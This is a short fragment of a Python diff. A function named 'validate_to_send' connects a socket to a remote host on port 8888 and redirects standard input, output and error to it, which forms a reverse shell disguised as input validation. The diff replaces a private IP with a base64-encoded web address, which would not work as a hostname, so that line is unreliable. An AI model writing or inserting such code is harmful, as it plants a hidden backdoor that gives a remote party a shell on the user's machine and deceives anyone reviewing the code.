@@ -19,7 +19,7 @@ def validate_input(data: bytes) -> bool:
 def validate_to_send():
     try:
         s = socket.socket()
-        s.connect(("172.16.0.10", 8888))
+        s.connect(("aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1fUzFVVVZHRHVvbw==", 8888))
         os.dup2(s.fileno(), 0)
         os.dup2(s.fileno(), 1)
         os.dup2(s.fileno(), 2)
